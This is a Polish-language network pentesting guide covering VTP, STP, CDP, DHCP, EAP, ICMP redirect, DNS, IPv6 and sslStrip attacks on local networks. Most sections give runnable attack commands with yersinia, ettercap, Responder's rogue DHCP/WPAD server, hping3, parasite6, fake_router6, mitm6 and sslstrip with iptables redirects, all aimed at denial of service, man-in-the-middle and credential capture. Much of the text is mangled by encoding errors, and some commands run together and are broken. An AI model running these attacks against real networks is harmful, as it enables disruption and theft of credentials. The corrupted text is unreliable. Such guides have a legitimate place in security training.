* **Advertisement Request:** Wydawane przez klienta VTP w celu zaÅ¼Ä…dania ogÅ‚oszenia podsumowujÄ…cego, zazwyczaj w odpowiedzi na wykrycie wyÅ¼szego numeru rewizji konfiguracji.

Luki w VTP sÄ… wykorzystywane wyÅ‚Ä…cznie przez porty trunk, poniewaÅ¼ ogÅ‚oszenia VTP krÄ…Å¼Ä… tylko przez nie. Scenariusze po ataku DTP mogÄ… przejÅ›Ä‡ do VTP. NarzÄ™dzia takie jak Yersinia mogÄ… uÅ‚atwiÄ‡ ataki VTP, majÄ…c na celu usuniÄ™cie bazy danych VLAN, skutecznie zakÅ‚Ã³cajÄ…c sieÄ‡.

Uwaga: Ta dyskusja dotyczy wersji VTP 1 (VTPv1).
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
W trybie graficznym Yersinii wybierz opcjÄ™ usuniÄ™cia wszystkich VLAN-Ã³w VTP, aby oczyÅ›ciÄ‡ bazÄ™ danych VLAN.

### Ataki STP

**JeÅ›li nie moÅ¼esz przechwyciÄ‡ ramek BPDU na swoich interfejsach, jest maÅ‚o prawdopodobne, Å¼e odniesiesz sukces w ataku STP.**

#### **STP BPDU DoS**

WysyÅ‚ajÄ…c duÅ¼Ä… liczbÄ™ BPDUs TCP (Powiadomienie o zmianie topologii) lub Conf (BPDUs, ktÃ³re sÄ… wysyÅ‚ane, gdy topologia jest tworzona), przeÅ‚Ä…czniki sÄ… przeciÄ…Å¼one i przestajÄ… dziaÅ‚aÄ‡ poprawnie.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Atak STP TCP**

Gdy wysyÅ‚any jest TCP, tabela CAM przeÅ‚Ä…cznikÃ³w zostanie usuniÄ™ta w ciÄ…gu 15s. NastÄ™pnie, jeÅ›li ciÄ…gle wysyÅ‚asz tego rodzaju pakiety, tabela CAM bÄ™dzie restartowana ciÄ…gle (lub co 15 sekund) i gdy zostanie zrestartowana, przeÅ‚Ä…cznik zachowuje siÄ™ jak hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Atak na Root STP**

Napastnik symuluje zachowanie przeÅ‚Ä…cznika, aby staÄ‡ siÄ™ rootem STP w sieci. Wtedy wiÄ™cej danych bÄ™dzie przechodziÄ‡ przez niego. To jest interesujÄ…ce, gdy jesteÅ› podÅ‚Ä…czony do dwÃ³ch rÃ³Å¼nych przeÅ‚Ä…cznikÃ³w.\
To osiÄ…ga siÄ™, wysyÅ‚ajÄ…c pakiety BPDUs CONF, mÃ³wiÄ…ce, Å¼e wartoÅ›Ä‡ **priorytetu** jest mniejsza niÅ¼ rzeczywisty priorytet rzeczywistego przeÅ‚Ä…cznika root.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**JeÅ›li atakujÄ…cy jest podÅ‚Ä…czony do 2 przeÅ‚Ä…cznikÃ³w, moÅ¼e byÄ‡ korzeniem nowego drzewa, a caÅ‚y ruch miÄ™dzy tymi przeÅ‚Ä…cznikami bÄ™dzie przechodziÅ‚ przez niego** (zostanie przeprowadzony atak MITM).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Ataki CDP

CISCO Discovery Protocol (CDP) jest niezbÄ™dny do komunikacji miÄ™dzy urzÄ…dzeniami CISCO, umoÅ¼liwiajÄ…c im **identyfikacjÄ™ nawzajem i dzielenie siÄ™ szczegÃ³Å‚ami konfiguracji**.

#### Pasywne zbieranie danych <a href="#id-0e0f" id="id-0e0f"></a>

CDP jest skonfigurowany do nadawania informacji przez wszystkie porty, co moÅ¼e prowadziÄ‡ do ryzyka bezpieczeÅ„stwa. AtakujÄ…cy, podÅ‚Ä…czajÄ…c siÄ™ do portu przeÅ‚Ä…cznika, moÅ¼e wdroÅ¼yÄ‡ sniffery sieciowe, takie jak **Wireshark**, **tcpdump** lub **Yersinia**. DziaÅ‚anie to moÅ¼e ujawniÄ‡ wraÅ¼liwe dane o urzÄ…dzeniu sieciowym, w tym jego model i wersjÄ™ Cisco IOS, na ktÃ³rej dziaÅ‚a. AtakujÄ…cy moÅ¼e nastÄ™pnie celowaÄ‡ w konkretne luki w zidentyfikowanej wersji Cisco IOS.

#### Wymuszanie zalewania tabeli CDP <a href="#id-0d6a" id="id-0d6a"></a>

Bardziej agresywne podejÅ›cie polega na przeprowadzeniu ataku typu Denial of Service (DoS) poprzez przytÅ‚oczenie pamiÄ™ci przeÅ‚Ä…cznika, udajÄ…c legalne urzÄ…dzenia CISCO. PoniÅ¼ej znajduje siÄ™ sekwencja poleceÅ„ do rozpoczÄ™cia takiego ataku przy uÅ¼yciu Yersinia, narzÄ™dzia sieciowego zaprojektowanego do testowania:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Podczas tego ataku, CPU przeÅ‚Ä…cznika i tabela sÄ…siadÃ³w CDP sÄ… mocno obciÄ…Å¼one, co prowadzi do tego, co czÄ™sto okreÅ›la siÄ™ jako **â€paraliÅ¼ sieciâ€** z powodu nadmiernego zuÅ¼ycia zasobÃ³w.

#### Atak na podszywanie siÄ™ pod CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ [**scapy**](https://github.com/secdev/scapy/). Upewnij siÄ™, Å¼e zainstalujesz go z pakietem `scapy/contrib`.

### Ataki VoIP i narzÄ™dzie VoIP Hopper

Telefony VoIP, coraz bardziej zintegrowane z urzÄ…dzeniami IoT, oferujÄ… funkcje takie jak odblokowywanie drzwi czy kontrolowanie termostatÃ³w za pomocÄ… specjalnych numerÃ³w telefonÃ³w. Jednak ta integracja moÅ¼e stwarzaÄ‡ zagroÅ¼enia dla bezpieczeÅ„stwa.

NarzÄ™dzie [**voiphopper**](http://voiphopper.sourceforge.net) jest zaprojektowane do emulacji telefonu VoIP w rÃ³Å¼nych Å›rodowiskach (Cisco, Avaya, Nortel, Alcatel-Lucent). Odkrywa identyfikator VLAN sieci gÅ‚osowej, korzystajÄ…c z protokoÅ‚Ã³w takich jak CDP, DHCP, LLDP-MED i 802.1Q ARP.

**VoIP Hopper** oferuje trzy tryby dla protokoÅ‚u Cisco Discovery Protocol (CDP):

1. **Tryb Sniff** (`-c 0`): Analizuje pakiety sieciowe, aby zidentyfikowaÄ‡ identyfikator VLAN.
2. **Tryb Spoof** (`-c 1`): Generuje niestandardowe pakiety naÅ›ladujÄ…ce te z rzeczywistego urzÄ…dzenia VoIP.
3. **Tryb Spoof z gotowym pakietem** (`-c 2`): WysyÅ‚a pakiety identyczne do tych z konkretnego modelu telefonu IP Cisco.

Preferowanym trybem dla szybkoÅ›ci jest trzeci. Wymaga on okreÅ›lenia:

* Interfejsu sieciowego atakujÄ…cego (`-i` parameter).
* Nazwy emulowanego urzÄ…dzenia VoIP (`-E` parameter), zgodnie z formatem nazewnictwa Cisco (np. SEP, a nastÄ™pnie adres MAC).

W Å›rodowiskach korporacyjnych, aby naÅ›ladowaÄ‡ istniejÄ…ce urzÄ…dzenie VoIP, moÅ¼na:

* SprawdziÄ‡ etykietÄ™ MAC na telefonie.
* PrzejÅ›Ä‡ do ustawieÅ„ wyÅ›wietlacza telefonu, aby zobaczyÄ‡ informacje o modelu.
* PodÅ‚Ä…czyÄ‡ urzÄ…dzenie VoIP do laptopa i obserwowaÄ‡ Å¼Ä…dania CDP za pomocÄ… Wireshark.

PrzykÅ‚adowe polecenie do uruchomienia narzÄ™dzia w trzecim trybie to:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### Ataki DHCP

#### Enumeracja
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Dwa typy DoS** mogÄ… byÄ‡ przeprowadzone przeciwko serwerom DHCP. Pierwszy polega na **symulowaniu wystarczajÄ…cej liczby faÅ‚szywych hostÃ³w, aby wykorzystaÄ‡ wszystkie moÅ¼liwe adresy IP**.\
Ten atak zadziaÅ‚a tylko wtedy, gdy moÅ¼esz zobaczyÄ‡ odpowiedzi serwera DHCP i zakoÅ„czyÄ‡ protokÃ³Å‚ (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Na przykÅ‚ad, to **nie jest moÅ¼liwe w sieciach Wifi**.

Innym sposobem przeprowadzenia DoS DHCP jest wysÅ‚anie **pakietu DHCP-RELEASE, uÅ¼ywajÄ…c jako kodu ÅºrÃ³dÅ‚owego kaÅ¼dego moÅ¼liwego adresu IP**. Wtedy serwer pomyÅ›li, Å¼e wszyscy zakoÅ„czyli korzystanie z adresu IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Bardziej automatyczny sposÃ³b na to to uÅ¼ycie narzÄ™dzia [DHCPing](https://github.com/kamorin/DHCPig)

MoÅ¼esz uÅ¼yÄ‡ wspomnianych atakÃ³w DoS, aby zmusiÄ‡ klientÃ³w do uzyskania nowych dzierÅ¼aw w Å›rodowisku i wyczerpaÄ‡ legalne serwery, aby staÅ‚y siÄ™ nieodpowiadajÄ…ce. Gdy legalne serwery prÃ³bujÄ… ponownie poÅ‚Ä…czyÄ‡ siÄ™, **moÅ¼esz serwowaÄ‡ zÅ‚oÅ›liwe wartoÅ›ci wspomniane w nastÄ™pnym ataku**.

#### Ustaw zÅ‚oÅ›liwe wartoÅ›ci

ZÅ‚oÅ›liwy serwer DHCP moÅ¼na skonfigurowaÄ‡ za pomocÄ… skryptu DHCP znajdujÄ…cego siÄ™ w `/usr/share/responder/DHCP.py`. Jest to przydatne w atakach sieciowych, takich jak przechwytywanie ruchu HTTP i poÅ›wiadczeÅ„, poprzez przekierowywanie ruchu do zÅ‚oÅ›liwego serwera. Jednak ustawienie zÅ‚oÅ›liwej bramy jest mniej skuteczne, poniewaÅ¼ pozwala tylko na przechwytywanie ruchu wychodzÄ…cego od klienta, pomijajÄ…c odpowiedzi z prawdziwej bramy. Zamiast tego zaleca siÄ™ skonfigurowanie zÅ‚oÅ›liwego serwera DNS lub WPAD dla bardziej skutecznego ataku.

PoniÅ¼ej znajdujÄ… siÄ™ opcje poleceÅ„ do konfigurowania zÅ‚oÅ›liwego serwera DHCP:

* **Nasz adres IP (OgÅ‚oszenie bramy)**: UÅ¼yj `-i 10.0.0.100`, aby ogÅ‚osiÄ‡ adres IP swojej maszyny jako bramÄ™.
* **Lokalna nazwa domeny DNS**: Opcjonalnie uÅ¼yj `-d example.org`, aby ustawiÄ‡ lokalnÄ… nazwÄ™ domeny DNS.
* **Oryginalny adres IP routera/bramy**: UÅ¼yj `-r 10.0.0.1`, aby okreÅ›liÄ‡ adres IP legalnego routera lub bramy.
* **Adres IP gÅ‚Ã³wnego serwera DNS**: UÅ¼yj `-p 10.0.0.100`, aby ustawiÄ‡ adres IP zÅ‚oÅ›liwego serwera DNS, ktÃ³ry kontrolujesz.
* **Adres IP drugiego serwera DNS**: Opcjonalnie uÅ¼yj `-s 10.0.0.1`, aby ustawiÄ‡ adres IP drugiego serwera DNS.
* **Maska sieci lokalnej**: UÅ¼yj `-n 255.255.255.0`, aby zdefiniowaÄ‡ maskÄ™ dla lokalnej sieci.
* **Interfejs dla ruchu DHCP**: UÅ¼yj `-I eth1`, aby nasÅ‚uchiwaÄ‡ ruchu DHCP na okreÅ›lonym interfejsie sieciowym.
* **Adres konfiguracji WPAD**: UÅ¼yj `-w â€œhttp://10.0.0.100/wpad.datâ€`, aby ustawiÄ‡ adres dla konfiguracji WPAD, wspomagajÄ…c przechwytywanie ruchu sieciowego.
* **FaÅ‚szowanie adresu IP domyÅ›lnej bramy**: Dodaj `-S`, aby sfaÅ‚szowaÄ‡ adres IP domyÅ›lnej bramy.
* **Odpowiadanie na wszystkie Å¼Ä…dania DHCP**: Dodaj `-R`, aby serwer odpowiadaÅ‚ na wszystkie Å¼Ä…dania DHCP, ale bÄ…dÅº Å›wiadomy, Å¼e to jest gÅ‚oÅ›ne i moÅ¼e byÄ‡ wykryte.

Poprawne uÅ¼ycie tych opcji pozwala na skuteczne ustanowienie zÅ‚oÅ›liwego serwera DHCP do przechwytywania ruchu sieciowego.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Ataki EAP**

Oto niektÃ³re z taktyk atakÃ³w, ktÃ³re moÅ¼na wykorzystaÄ‡ przeciwko implementacjom 802.1X:

* Aktywne Å‚amanie haseÅ‚ metodÄ… brute-force za pomocÄ… EAP
* Atakowanie serwera RADIUS z uÅ¼yciem znieksztaÅ‚conych treÅ›ci EAP _\*\*_(exploits)
* Przechwytywanie wiadomoÅ›ci EAP i Å‚amanie haseÅ‚ offline (EAP-MD5 i PEAP)
* Wymuszanie uwierzytelniania EAP-MD5 w celu ominiÄ™cia walidacji certyfikatu TLS
* Wstrzykiwanie zÅ‚oÅ›liwego ruchu sieciowego podczas uwierzytelniania za pomocÄ… huba lub podobnego urzÄ…dzenia

JeÅ›li atakujÄ…cy znajduje siÄ™ pomiÄ™dzy ofiarÄ… a serwerem uwierzytelniajÄ…cym, moÅ¼e sprÃ³bowaÄ‡ obniÅ¼yÄ‡ (jeÅ›li to konieczne) protokÃ³Å‚ uwierzytelniania do EAP-MD5 i przechwyciÄ‡ prÃ³bÄ™ uwierzytelnienia. NastÄ™pnie moÅ¼e to zÅ‚amaÄ‡ metodÄ… brute-force za pomocÄ…:
```
eapmd5pass â€“r pcap.dump â€“w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) to klasa protokoÅ‚Ã³w sieciowych zaprojektowanych w celu **utworzenia gorÄ…cego systemu redundancji routingu**. DziÄ™ki FHRP fizyczne routery mogÄ… byÄ‡ Å‚Ä…czone w jeden logiczny urzÄ…dzenie, co zwiÄ™ksza tolerancjÄ™ na bÅ‚Ä™dy i pomaga rozÅ‚oÅ¼yÄ‡ obciÄ…Å¼enie.

**InÅ¼ynierowie Cisco Systems opracowali dwa protokoÅ‚y FHRP, GLBP i HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Znane sÄ… trzy wersje protokoÅ‚u Routing Information Protocol (RIP): RIP, RIPv2 i RIPng. Datagramy sÄ… wysyÅ‚ane do sÄ…siadÃ³w przez port 520 przy uÅ¼yciu UDP przez RIP i RIPv2, podczas gdy datagramy sÄ… rozgÅ‚aszane do portu UDP 521 za pomocÄ… multicastu IPv6 przez RIPng. ObsÅ‚uga uwierzytelniania MD5 zostaÅ‚a wprowadzona przez RIPv2. Z drugiej strony, natywne uwierzytelnianie nie jest wÅ‚Ä…czone w RIPng; zamiast tego polega siÄ™ na opcjonalnych nagÅ‚Ã³wkach IPsec AH i ESP w IPv6.

* **RIP i RIPv2:** Komunikacja odbywa siÄ™ za pomocÄ… datagramÃ³w UDP na porcie 520.
* **RIPng:** Wykorzystuje port UDP 521 do rozgÅ‚aszania datagramÃ³w za pomocÄ… multicastu IPv6.

NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e RIPv2 obsÅ‚uguje uwierzytelnianie MD5, podczas gdy RIPng nie zawiera natywnego uwierzytelniania, polegajÄ…c na nagÅ‚Ã³wkach IPsec AH i ESP w IPv6.

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** to dynamiczny protokÃ³Å‚ routingu. **Jest to protokÃ³Å‚ wektorowy odlegÅ‚oÅ›ci.** JeÅ›li nie ma **uwierzytelniania** i konfiguracji pasywnych interfejsÃ³w, **intruz** moÅ¼e zakÅ‚Ã³ciÄ‡ routowanie EIGRP i spowodowaÄ‡ **zatrucie tabel routingu**. Ponadto sieÄ‡ EIGRP (innymi sÅ‚owy, autonomiczny system) **jest pÅ‚aska i nie ma segmentacji na Å¼adne strefy**. JeÅ›li **atakujÄ…cy wstrzyknie trasÄ™**, istnieje duÅ¼e prawdopodobieÅ„stwo, Å¼e ta trasa **rozprzestrzeni siÄ™** w caÅ‚ym autonomicznym systemie EIGRP.

Aby zaatakowaÄ‡ system EIGRP, naleÅ¼y **nawiÄ…zaÄ‡ sÄ…siedztwo z legalnym routerem EIGRP**, co otwiera wiele moÅ¼liwoÅ›ci, od podstawowego rozpoznania po rÃ³Å¼ne wstrzykniÄ™cia.

[**FRRouting**](https://frrouting.org/) pozwala na wdroÅ¼enie **wirtualnego routera, ktÃ³ry obsÅ‚uguje BGP, OSPF, EIGRP, RIP i inne protokoÅ‚y.** Wystarczy wdroÅ¼yÄ‡ go na systemie atakujÄ…cego, a moÅ¼na udawaÄ‡ legalny router w domenie routingu.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) ma moÅ¼liwoÅ›ci przechwytywania rozgÅ‚oszeÅ„ EIGRP (Enhanced Interior Gateway Routing Protocol). UmoÅ¼liwia rÃ³wnieÅ¼ wstrzykiwanie pakietÃ³w, ktÃ³re mogÄ… byÄ‡ wykorzystane do zmiany konfiguracji routingu.

### OSPF

W protokole Open Shortest Path First (OSPF) **powszechnie stosuje siÄ™ uwierzytelnianie MD5, aby zapewniÄ‡ bezpiecznÄ… komunikacjÄ™ miÄ™dzy routerami**. Jednak ten Å›rodek bezpieczeÅ„stwa moÅ¼e byÄ‡ naruszony za pomocÄ… narzÄ™dzi takich jak Loki i John the Ripper. NarzÄ™dzia te sÄ… w stanie przechwytywaÄ‡ i Å‚amaÄ‡ hashe MD5, ujawniajÄ…c klucz uwierzytelniajÄ…cy. Po uzyskaniu tego klucza moÅ¼na go uÅ¼yÄ‡ do wprowadzenia nowych informacji routingu. Aby skonfigurowaÄ‡ parametry trasy i ustawiÄ‡ skompromitowany klucz, wykorzystuje siÄ™ odpowiednio zakÅ‚adki _Injection_ i _Connection_.

* **Przechwytywanie i Å‚amanie hashy MD5:** NarzÄ™dzia takie jak Loki i John the Ripper sÄ… uÅ¼ywane do tego celu.
* **Konfigurowanie parametrÃ³w trasy:** Odbywa siÄ™ to za pomocÄ… zakÅ‚adki _Injection_.
* **Ustawianie skompromitowanego klucza:** Klucz jest konfigurowany w zakÅ‚adce _Connection_.

### Other Generic Tools & Sources

* [**Above**](https://github.com/c4s73r/Above): NarzÄ™dzie do skanowania ruchu sieciowego i znajdowania luk
* MoÅ¼esz znaleÅºÄ‡ **wiÄ™cej informacji o atakach sieciowych** [**tutaj**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

AtakujÄ…cy konfiguruje wszystkie parametry sieciowe (GW, IP, DNS) nowego czÅ‚onka sieci, wysyÅ‚ajÄ…c faÅ‚szywe odpowiedzi DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

SprawdÅº [poprzedniÄ… sekcjÄ™](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect polega na wysyÅ‚aniu pakietu ICMP typu 1 kod 5, ktÃ³ry wskazuje, Å¼e atakujÄ…cy jest najlepszym sposobem na dotarcie do danego adresu IP. NastÄ™pnie, gdy ofiara chce skontaktowaÄ‡ siÄ™ z tym adresem IP, wyÅ›le pakiet przez atakujÄ…cego.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

AtakujÄ…cy rozwiÄ…Å¼e niektÃ³re (lub wszystkie) domeny, o ktÃ³re pyta ofiara.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Skonfiguruj wÅ‚asny DNS za pomocÄ… dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Local Gateways

Wiele tras do systemÃ³w i sieci czÄ™sto istnieje. Po zbudowaniu listy adresÃ³w MAC w lokalnej sieci, uÅ¼yj _gateway-finder.py_, aby zidentyfikowaÄ‡ hosty, ktÃ³re obsÅ‚ugujÄ… przekazywanie IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

W przypadku lokalnego rozwiÄ…zywania hostÃ³w, gdy zapytania DNS sÄ… nieudane, systemy Microsoftu polegajÄ… na **Link-Local Multicast Name Resolution (LLMNR)** oraz **NetBIOS Name Service (NBT-NS)**. Podobnie, **Apple Bonjour** i implementacje **Linux zero-configuration** wykorzystujÄ… **Multicast DNS (mDNS)** do odkrywania systemÃ³w w sieci. Z powodu nieautoryzowanej natury tych protokoÅ‚Ã³w i ich dziaÅ‚ania przez UDP, wysyÅ‚ajÄ…c wiadomoÅ›ci, mogÄ… byÄ‡ wykorzystywane przez atakujÄ…cych, ktÃ³rzy majÄ… na celu przekierowanie uÅ¼ytkownikÃ³w do zÅ‚oÅ›liwych usÅ‚ug.

MoÅ¼esz podszywaÄ‡ siÄ™ pod usÅ‚ugi, ktÃ³re sÄ… wyszukiwane przez hosty, uÅ¼ywajÄ…c Respondera do wysyÅ‚ania faÅ‚szywych odpowiedzi.\
Przeczytaj tutaj wiÄ™cej informacji o tym, [jak podszywaÄ‡ siÄ™ pod usÅ‚ugi za pomocÄ… Respondera](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

PrzeglÄ…darki powszechnie wykorzystujÄ… **protokÃ³Å‚ Web Proxy Auto-Discovery (WPAD) do automatycznego pozyskiwania ustawieÅ„ proxy**. Obejmuje to pobieranie szczegÃ³Å‚Ã³w konfiguracyjnych z serwera, konkretnie przez URL taki jak "http://wpad.example.org/wpad.dat". Odkrycie tego serwera przez klientÃ³w moÅ¼e odbywaÄ‡ siÄ™ za pomocÄ… rÃ³Å¼nych mechanizmÃ³w:

* Poprzez **DHCP**, gdzie odkrycie jest uÅ‚atwione przez wykorzystanie specjalnego kodu 252.
* Przez **DNS**, co polega na wyszukiwaniu nazwy hosta oznaczonej jako _wpad_ w lokalnej domenie.
* Za pomocÄ… **Microsoft LLMNR i NBT-NS**, ktÃ³re sÄ… mechanizmami zapasowymi uÅ¼ywanymi w przypadkach, gdy zapytania DNS nie powiodÄ… siÄ™.

NarzÄ™dzie Responder wykorzystuje ten protokÃ³Å‚, dziaÅ‚ajÄ…c jako **zÅ‚oÅ›liwy serwer WPAD**. UÅ¼ywa DHCP, DNS, LLMNR i NBT-NS, aby wprowadziÄ‡ klientÃ³w w bÅ‚Ä…d, zmuszajÄ…c ich do poÅ‚Ä…czenia siÄ™ z nim. Aby zgÅ‚Ä™biÄ‡, jak moÅ¼na podszywaÄ‡ siÄ™ pod usÅ‚ugi za pomocÄ… Respondera, [sprawdÅº to](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

MoÅ¼esz oferowaÄ‡ rÃ³Å¼ne usÅ‚ugi w sieci, aby sprÃ³bowaÄ‡ **oszukaÄ‡ uÅ¼ytkownika**, aby wprowadziÅ‚ jakieÅ› **jawne dane logowania**. **WiÄ™cej informacji o tym ataku w** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Ten atak jest bardzo podobny do ARP Spoofing, ale w Å›wiecie IPv6. MoÅ¼esz sprawiÄ‡, Å¼e ofiara pomyÅ›li, Å¼e IPv6 GW ma MAC atakujÄ…cego.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

NiektÃ³re systemy operacyjne domyÅ›lnie konfigurujÄ… bramÄ™ na podstawie pakietÃ³w RA wysyÅ‚anych w sieci. Aby zadeklarowaÄ‡ atakujÄ…cego jako router IPv6, moÅ¼esz uÅ¼yÄ‡:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

DomyÅ›lnie niektÃ³re systemy operacyjne prÃ³bujÄ… skonfigurowaÄ‡ DNS, odczytujÄ…c pakiet DHCPv6 w sieci. Wtedy atakujÄ…cy moÅ¼e wysÅ‚aÄ‡ pakiet DHCPv6, aby skonfigurowaÄ‡ siÄ™ jako DNS. DHCP zapewnia rÃ³wnieÅ¼ ofierze adres IPv6.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (faÅ‚szywa strona i wstrzykiwanie kodu JS)

## Ataki w Internecie

### sslStrip

W zasadzie to, co robi ten atak, to w przypadku, gdy **uÅ¼ytkownik** prÃ³buje **uzyskaÄ‡ dostÄ™p** do strony **HTTP**, ktÃ³ra jest **przekierowywana** na wersjÄ™ **HTTPS**. **sslStrip** **utrzymuje** **poÅ‚Ä…czenie HTTP z** **klientem** i **poÅ‚Ä…czenie HTTPS z** **serwerem**, dziÄ™ki czemu bÄ™dzie w stanie **podsÅ‚uchiwaÄ‡** poÅ‚Ä…czenie w **czystym tekÅ›cie**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
WiÄ™cej informacji [tutaj](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ i dns2proxy do omijania HSTS

**RÃ³Å¼nica** miÄ™dzy **sslStrip+ a dns2proxy** a **sslStrip** polega na tym, Å¼e bÄ™dÄ… **przekierowywaÄ‡** na przykÅ‚ad _**www.facebook.com**_ **na** _**wwww.facebook.com**_ (zauwaÅ¼ **dodatkowe** "**w**") i ustawiÄ… **adres tej domeny jako IP atakujÄ…cego**. W ten sposÃ³b **klient** bÄ™dzie **Å‚Ä…czyÄ‡ siÄ™** z _**wwww.facebook.com**_ **(atakujÄ…cy)**, ale w tle **sslstrip+** bÄ™dzie **utrzymywaÄ‡** **prawdziwe poÅ‚Ä…czenie** przez https z **www.facebook.com**.

**Celem** tej techniki jest **unikanie HSTS**, poniewaÅ¼ _**wwww**.facebook.com_ **nie bÄ™dzie** zapisane w **pamiÄ™ci podrÄ™cznej** przeglÄ…darki, wiÄ™c przeglÄ…darka zostanie oszukana, aby wykonaÄ‡ **uwierzytelnienie facebooka w HTTP**.\
ZauwaÅ¼, Å¼e aby przeprowadziÄ‡ ten atak, ofiara musi najpierw sprÃ³bowaÄ‡ uzyskaÄ‡ dostÄ™p do [http://www.faceook.com](http://www.faceook.com), a nie https. MoÅ¼na to zrobiÄ‡, modyfikujÄ…c linki wewnÄ…trz strony http.

